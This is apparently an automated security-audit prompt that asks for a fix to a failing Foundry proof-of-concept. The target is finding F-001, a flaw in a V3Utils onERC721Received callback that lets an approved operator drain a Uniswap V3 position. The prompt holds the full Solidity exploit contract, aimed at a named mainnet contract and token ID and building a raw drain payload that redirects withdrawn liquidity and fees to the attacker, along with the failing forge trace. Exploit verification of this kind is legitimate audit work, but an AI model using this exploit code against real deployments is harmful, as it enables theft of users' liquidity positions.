You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any approved NFT operator can force callback execution and drain a position's withdrawable value
- claim: `onERC721Received` only checks that the NFT came from the Uniswap position manager, then blindly decodes and executes arbitrary `Instructions` against the transferred position before returning the NFT to `from`. It never verifies that the owner initiated the transfer or that the flow came through `execute()`. Because any address approved for the position NFT can call `nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(instructions))`, an approved operator can force `WITHDRAW_AND_COLLECT_AND_SWAP`, `COMPOUND_FEES`, or `CHANGE_RANGE` with attacker-chosen parameters and attacker-controlled `instructions.recipient`.
- impact: Any marketplace, delegated manager, or other approved operator can steal all currently withdrawable liquidity and fees from a victim Uniswap V3 position without retaining custody of the NFT: the victim receives the NFT back after execution, but the tokens have already been redirected.
- exploit_paths: ["Victim grants `approve(tokenId)` or `setApprovalForAll` on their Uniswap V3 position NFT to an external operator.", "The operator calls `nonfungiblePositionManager.safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))` directly, setting `instructions.recipient` to an attacker-controlled address and choosing a draining action.", "`V3Utils` decreases liquidity, collects fees, optionally swaps, and pays the resulting tokens to the attacker before returning the now-depleted NFT to `from`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface INonfungiblePositionManagerMinimal {
    function ownerOf(uint256 tokenId) external view returns (address);

    function getApproved(uint256 tokenId) external view returns (address);

    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract FlawVerifier {
    enum WhatToDo {
        CHANGE_RANGE,
        WITHDRAW_AND_COLLECT_AND_SWAP,
        COMPOUND_FEES
    }

    struct Instructions {
        WhatToDo whatToDo;
        address targetToken;
        uint256 amountIn0;
        uint256 amountOut0Min;
        bytes swapData0;
        uint256 amountIn1;
        uint256 amountOut1Min;
        bytes swapData1;
        uint128 feeAmount0;
        uint128 feeAmount1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 amountAddMin0;
        uint256 amountAddMin1;
        uint256 deadline;
        address recipient;
        bool unwrap;
        bytes returnData;
        bytes swapAndMintReturnData;
    }

    struct Opportunity {
        address owner;
        address token0;
        address token1;
        address targetToken;
        uint128 liquidity;
        bool hasWithdrawableValue;
    }

    address internal constant TARGET = 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public attempted;
    bool public exploitSucceeded;
    bool public approvalObserved;
    address public observedOwner;
    address public observedApprovedOperator;
    bool public observedApprovalForAll;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit(address(0), address(0), 0, 0);
            return;
        }
        attempted = true;

        _attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID);
    }

    function _attemptApprovedOperatorDrain(uint256 tokenId) internal {
        Opportunity memory opportunity = _readOpportunity(tokenId);

        observedOwner = opportunity.owner;
        observedApprovedOperator = INonfungiblePositionManagerMinimal(POSITION_MANAGER).getApproved(tokenId);
        observedApprovalForAll =
            opportunity.owner != address(0)
                && INonfungiblePositionManagerMinimal(POSITION_MANAGER).isApprovedForAll(opportunity.owner, address(this));
        approvalObserved = observedApprovedOperator == address(this) || observedApprovalForAll;

        if (!opportunity.hasWithdrawableValue) {
            lastError = abi.encodePacked("candidate position has no withdrawable value");
            _syncProfit(opportunity.token0, opportunity.token1, 0, 0);
            return;
        }

        _executeDrain(tokenId, opportunity);
    }

    function _executeDrain(uint256 tokenId, Opportunity memory opportunity) internal {
        uint256 before0 = _balanceOf(opportunity.token0);
        uint256 before1 = opportunity.token1 == opportunity.token0 ? before0 : _balanceOf(opportunity.token1);

        // Path 0: the victim must already have granted approve(tokenId) or setApprovalForAll
        // to this verifier for the exploit to be mechanically executable on the fork.
        //
        // Path 1: as that approved operator, call
        // `safeTransferFrom(owner, V3Utils, tokenId, abi.encode(instructions))` directly.
        //
        // Path 2: use the vulnerable callback to decrease all available liquidity, collect all
        // withdrawable fees, and redirect the resulting tokens to `instructions.recipient`.
        //
        // Empty swap payloads are intentional: V3Utils still forwards any unswapped leftovers to
        // `instructions.recipient`, so the forced callback drains withdrawable value without
        // needing off-chain quote data or any artificial funding.
        bytes memory instructionData = _buildDrainInstructionData(opportunity.targetToken, opportunity.liquidity);
        bool ok = _callTransfer(opportunity.owner, tokenId, instructionData);

        exploitSucceeded = ok;
        _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
    }

    function _readOpportunity(uint256 tokenId)
        internal
        view
        returns (Opportunity memory opportunity)
    {
        uint128 tokensOwed0;
        uint128 tokensOwed1;

        opportunity.owner = INonfungiblePositionManagerMinimal(POSITION_MANAGER).ownerOf(tokenId);

        (
            ,
            ,
            opportunity.token0,
            opportunity.token1,
            ,
            ,
            ,
            opportunity.liquidity,
            ,
            ,
            tokensOwed0,
            tokensOwed1
        ) = INonfungiblePositionManagerMinimal(POSITION_MANAGER).positions(tokenId);

        if (opportunity.token0 == WETH) {
            opportunity.targetToken = opportunity.token0;
        } else if (opportunity.token1 == WETH) {
            opportunity.targetToken = opportunity.token1;
        } else {
            opportunity.targetToken = opportunity.token0;
        }

        opportunity.hasWithdrawableValue =
            opportunity.liquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
    }

    function _buildDrainInstructionData(address targetToken, uint128 liquidity)
        internal
        view
        returns (bytes memory instructionData)
    {
        // Build the exact abi.encode(Instructions) payload expected by V3Utils.
        // swapData0, swapData1, returnData, and swapAndMintReturnData are empty by design.
        instructionData = new bytes(0x320);

        assembly {
            let ptr := add(instructionData, 0x20)

            mstore(add(ptr, 0x00), 1) // whatToDo = WITHDRAW_AND_COLLECT_AND_SWAP
            mstore(add(ptr, 0x20), shl(96, targetToken))
            mstore(add(ptr, 0x80), 0x2a0) // swapData0 offset
            mstore(add(ptr, 0xe0), 0x2c0) // swapData1 offset
            mstore(add(ptr, 0x100), 0xffffffffffffffffffffffffffffffff) // feeAmount0 = type(uint128).max
            mstore(add(ptr, 0x120), 0xffffffffffffffffffffffffffffffff) // feeAmount1 = type(uint128).max
            mstore(add(ptr, 0x1a0), liquidity)
            mstore(add(ptr, 0x200), timestamp())
            mstore(add(ptr, 0x220), shl(96, address()))
            mstore(add(ptr, 0x260), 0x2e0) // returnData offset
            mstore(add(ptr, 0x280), 0x300) // swapAndMintReturnData offset
        }
    }

    function _callTransfer(address owner, uint256 tokenId, bytes memory instructionData) internal returns (bool ok) {
        bytes memory err;

        (ok, err) = POSITION_MANAGER.call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector, owner, TARGET, tokenId, instructionData
            )
        );

        if (!ok) {
            lastError = err;
        }
    }

    function _syncProfit(address token0, address token1, uint256 before0, uint256 before1) internal {
        uint256 afterProfit = _balanceOf(_profitToken);

        if (token0 == address(0) && token1 == address(0)) {
            _profitAmount = afterProfit;
            return;
        }

        uint256 after0 = _balanceOf(token0);
        uint256 delta0 = after0 > before0 ? after0 - before0 : 0;

        uint256 delta1;
        if (token1 != address(0)) {
            uint256 after1 = token1 == token0 ? after0 : _balanceOf(token1);
            delta1 = after1 > before1 ? after1 - before1 : 0;
        }

        if (delta1 > delta0) {
            _profitToken = token1;
            _profitAmount = delta1;
        } else {
            _profitToken = token0 == address(0) ? _profitToken : token0;
            _profitAmount = delta0;
        }
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }
}

```

forge stdout (tail):
```
C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [190958] FlawVerifier::executeOnOpportunity()
    │   ├─ [7062] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::ownerOf(422882 [4.228e5]) [staticcall]
    │   │   └─ ← [Return] 0xb88d3ADE7E4231c97038F6D82475A233772fFC25
    │   ├─ [16948] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::positions(422882 [4.228e5]) [staticcall]
    │   │   └─ ← [Return] 0, 0x0000000000000000000000000000000000000000, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xd2877702675e6cEb975b4A1dFf9fb7BAF4C91ea9, 10000 [1e4], 155200 [1.552e5], 162400 [1.624e5], 76947262896455713642486 [7.694e22], 4673678257530921576842502055271665 [4.673e33], 44241796310111812353509144953562460485442 [4.424e40], 1562296817116982 [1.562e15], 14073154402658570771132 [1.407e22]
    │   ├─ [943] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::getApproved(422882 [4.228e5]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2830] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::isApprovedForAll(0xb88d3ADE7E4231c97038F6D82475A233772fFC25, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2585] 0xd2877702675e6cEb975b4A1dFf9fb7BAF4C91ea9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3278] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::safeTransferFrom(0xb88d3ADE7E4231c97038F6D82475A233772fFC25, 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD, 422882 [4.228e5], 0x0000000000000000000000000000000000000000000000000000000000000001c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104b51c970414df157f6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000063f05f1b5615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   │   └─ ← [Revert] ERC721: transfer caller is not owner nor approved
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [585] 0xd2877702675e6cEb975b4A1dFf9fb7BAF4C91ea9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [349] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [348] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16653389 [1.665e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC36442b4a4522E871399CD717aBDD847Ab11FE88.safeTransferFrom
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.65s (1.66s CPU time)

Ran 1 test suite in 2.71s (2.65s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 233522)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
